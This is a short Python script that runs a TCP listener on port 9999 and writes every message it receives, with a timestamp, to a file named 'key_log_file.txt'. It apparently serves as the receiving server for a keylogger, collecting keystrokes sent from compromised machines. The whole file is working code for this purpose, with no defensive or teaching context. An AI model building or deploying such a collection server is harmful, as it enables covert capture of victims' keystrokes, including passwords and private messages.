import socket
import datetime



my_pc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_pc.bind(("0.0.0.0", 9999))
my_pc.listen()

while True:
    
    
    client, address = my_pc.accept()
    while True:
        info_bytes = client.recv(1024)
        if not info_bytes:
            break
        info = info_bytes.decode()
        datetimestr = str(datetime.datetime.now())
        
        with open("key_log_file.txt", "a") as f:
            f.write(datetimestr)
            f.write("\n")
            f.write(info)
            f.write("\n")
            f.write("\n")

